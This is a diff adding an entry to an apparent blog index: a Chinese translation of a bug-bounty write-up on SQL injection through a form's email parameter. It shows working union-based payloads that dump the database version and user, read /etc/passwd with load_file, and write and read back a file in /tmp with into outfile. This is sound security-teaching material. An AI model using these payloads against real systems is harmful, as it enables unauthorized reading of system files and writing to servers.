@@ -3,6 +3,25 @@
   
     
     <entry>
+      <title><![CDATA[第十五篇：SQL注入读取、写入文件]]></title>
+      <url>/2019/02/14/%E7%AC%AC%E5%8D%81%E4%BA%94%E7%AF%87%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E3%80%81%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6/</url>
+      <content type="html"><![CDATA[<h4 id="原文：SQL-injection-with-load-file-and-into-outfile"><a href="#原文：SQL-injection-with-load-file-and-into-outfile" class="headerlink" title="原文：SQL injection with load file and into outfile"></a>原文：<a href="https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2" target="_blank" rel="external">SQL injection with load file and into outfile</a></h4><h4 id="漏洞：SQL注入漏洞"><a href="#漏洞：SQL注入漏洞" class="headerlink" title="漏洞：SQL注入漏洞"></a>漏洞：SQL注入漏洞</h4><h4 id="作者：NoGe"><a href="#作者：NoGe" class="headerlink" title="作者：NoGe"></a>作者：<a href="https://medium.com/@p4c3n0g3" target="_blank" rel="external">NoGe</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
+<h4 id="我像往常一样注册网站会员"><a href="#我像往常一样注册网站会员" class="headerlink" title="我像往常一样注册网站会员"></a>我像往常一样注册网站会员</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/1.png" alt=""></p>
+<h4 id="然后通过POST方法将表单信息发送到-https-www-blablabla-com-svc-form-affiliate。"><a href="#然后通过POST方法将表单信息发送到-https-www-blablabla-com-svc-form-affiliate。" class="headerlink" title="然后通过POST方法将表单信息发送到 https://www.blablabla.com/svc/*****/form_affiliate。"></a>然后通过POST方法将表单信息发送到 <a href="https://www.blablabla.com/svc/*****/form_affiliate。" target="_blank" rel="external">https://www.blablabla.com/svc/*****/form_affiliate。</a></h4><h4 id="这里的email参数存在SQL注入漏洞"><a href="#这里的email参数存在SQL注入漏洞" class="headerlink" title="这里的email参数存在SQL注入漏洞"></a>这里的email参数存在SQL注入漏洞</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/2.png" alt=""></p>
+<h4 id="于是我在请求框-email-””-参数中插入SQL语句"><a href="#于是我在请求框-email-””-参数中插入SQL语句" class="headerlink" title="于是我在请求框 [email=””]参数中插入SQL语句"></a>于是我在请求框 [email=””]参数中插入SQL语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select concat_ws(0x3a,version(),user(),database())--+</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/3.png" alt=""></p>
+<h4 id="结果在响应窗口显示-“5-5-41-log-root-10-130-0-1-tp-cart”。"><a href="#结果在响应窗口显示-“5-5-41-log-root-10-130-0-1-tp-cart”。" class="headerlink" title="结果在响应窗口显示 “5.5.41-log:root@10.130.0.1:tp_cart”。"></a>结果在响应窗口显示 “5.5.41-log:root@10.130.0.1:tp_cart”。</h4><h4 id="现在我尝试使用SQL命令来读取文件"><a href="#现在我尝试使用SQL命令来读取文件" class="headerlink" title="现在我尝试使用SQL命令来读取文件"></a>现在我尝试使用SQL命令来读取文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select load_file(&apos;/etc/passwd&apos;)--+</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/4.png" alt=""></p>
+<h4 id="接着尝试在-tmp目录写入文件"><a href="#接着尝试在-tmp目录写入文件" class="headerlink" title="接着尝试在/tmp目录写入文件"></a>接着尝试在/tmp目录写入文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select &apos;blablalba_bug_bounty_program&apos; into outfile &apos;/tmp/blablabla&apos;--+</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/5.png" alt=""></p>
+<h4 id="最后我们看看文件是否成功写入"><a href="#最后我们看看文件是否成功写入" class="headerlink" title="最后我们看看文件是否成功写入"></a>最后我们看看文件是否成功写入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select load_file(&apos;/tmp/blablabla&apos;)--+</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/6.png" alt=""></p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[第十四篇：SSRF读取本地文件]]></title>
       <url>/2019/02/14/%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AF%87%EF%BC%9ASSRF%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6/</url>
       <content type="html"><![CDATA[<h4 id="原文：Server-Side-Request-Forgery-SSRF-Testing"><a href="#原文：Server-Side-Request-Forgery-SSRF-Testing" class="headerlink" title="原文：Server Side Request Forgery(SSRF) Testing"></a>原文：<a href="https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d" target="_blank" rel="external"><em>Server Side Request Forgery</em>(<em>SSRF</em>) Testing</a></h4><h4 id="漏洞：SSRF漏洞"><a href="#漏洞：SSRF漏洞" class="headerlink" title="漏洞：SSRF漏洞"></a>漏洞：SSRF漏洞</h4><h4 id="作者：NoGe"><a href="#作者：NoGe" class="headerlink" title="作者：NoGe"></a>作者：<a href="https://medium.com/@p4c3n0g3" target="_blank" rel="external">NoGe</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
